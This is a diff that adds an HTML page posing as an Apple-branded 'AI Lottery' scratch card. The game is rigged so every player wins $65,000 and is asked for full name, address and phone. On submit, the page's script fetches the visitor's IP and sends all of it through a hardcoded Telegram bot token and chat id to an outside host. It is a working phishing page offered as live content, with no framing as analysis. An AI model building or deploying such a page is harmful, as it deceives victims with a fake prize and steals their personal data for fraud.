@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="/img/apple.ico">
+  <title>Scratch and Win</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background: #000;
+      color: #fff;
+      padding: 20px;
+    }
+    #game-board {
+      display: grid;
+      grid-template-columns: repeat(5, 60px);
+      gap: 10px;
+      justify-content: center;
+      margin: 20px 0;
+    }
+    .box {
+      width: 60px;
+      height: 60px;
+      background: #222;
+      border: 2px solid #fff;
+      font-size: 24px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-shadow: 0 0 5px #0f0;
+      box-shadow: 0 0 10px #0ff;
+    }
+    .scratched {
+      background: #111;
+      cursor: default;
+    }
+    input {
+      display: block;
+      margin: 10px auto;
+      padding: 10px;
+      width: 80%;
+      max-width: 300px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      background: #0f0;
+      color: #000;
+      border: none;
+      box-shadow: 0 0 10px #0f0;
+    }
+  </style>
+</head>
+<header>
+    <div style="background-color: #0000ft; padding: 20px; max-width: 400px; border-radius: 8px; box-shadow: 0 0 10px pink; color: black; text-align: center; font-size: 18px; font-weight: bold;">
+        <img width="35" height="35" src="https://i.postimg.cc/3WnjhLq9/apple.png" alt="mac-os"/><font color="gray">Apple AI Lottery Game</font></header>
+<body>
+
+  <h1>Scratch and Win!</h1> <br>
+    <h3>Tourch 4 box below if you win you're lucky</h3>
+  </br>
+  <div id="game-board"></div>
+  <div id="result"></div>
+
+  <form id="winner-form" style="display:none;">
+    <h2>Congratulations! You won $65,000!</h2>
+    <input type="text" id="name" placeholder="Full Name" required>
+    <input type="text" id="address" placeholder="Address" required>
+    <input type="text" id="phone" placeholder="Phone" required>
+    <button type="submit">Claim Prize</button>
+  </form>
+
+  <script>
+    if (localStorage.getItem('hasPlayed')) {
+      document.body.innerHTML = '<h1>Sorry, you have already played.</h1>';
+    } else {
+      const board = document.getElementById("game-board");
+      const result = document.getElementById("result");
+      const form = document.getElementById("winner-form");
+
+      const scratchResults = ["$", "X", "$", "$"];
+      const boxes = Array(10).fill(null);
+      let scratchCount = 0;
+      let wins = 0;
+
+      const scratchSound = new Audio('scratch.mp3');
+      const winSound = new Audio('win.mp3');
+
+      boxes.forEach((_, i) => {
+        const div = document.createElement("div");
+        div.classList.add("box");
+        div.innerText = "?";
+        div.onclick = () => {
+          if (div.classList.contains("scratched") || scratchCount >= 4) return;
+
+          scratchSound.play();
+
+          const symbol = scratchResults[scratchCount] || "X";
+          div.innerText = symbol;
+          div.classList.add("scratched");
+          if (symbol === "$") wins++;
+          scratchCount++;
+
+          if (scratchCount === 4) {
+            if (wins >= 3) {
+              winSound.play();
+              result.innerText = "You won $65,000!";
+              board.style.display = "none";
+              form.style.display = "block";
+            } else {
+              result.innerText = "Sorry, try again!";
+            }
+            localStorage.setItem('hasPlayed', true);
+          }
+        };
+        board.appendChild(div);
+      });
+
+      form.onsubmit = async function(e) {
+        e.preventDefault();
+        const name = document.getElementById("name").value;
+        const address = document.getElementById("address").value;
+        const phone = document.getElementById("phone").value;
+        const timestamp = new Date().toLocaleString();
+
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+
+        const token = "7612075949:AAFYpoGkaGHsFsM00zt1QQkKowiBxDORmr0";
+        const chat_id = "7486773651";
+        const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        await fetch(telegramURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id,
+            text: `New Winner!\nName: ${name}\nAddress: ${address}\nPhone: ${phone}\nTimestamp: ${timestamp}\nIP: ${ip}`
+          })
+        });
+
+        window.location.href = "certificate.html";
+      };
+    }
+  </script>
+
+</body>
+</br>
+</br>
+</br>
+<!-- Footer -->
+    <footer>
+         <img width="20" height="20" src="https://i.postimg.cc/3WnjhLq9/apple.png" alt="mac-os"/>  &copy; 2025 IA Lottery.| All Rights Reserved | Play Smart, Win Big! </p>
+    </footer>
+</html>
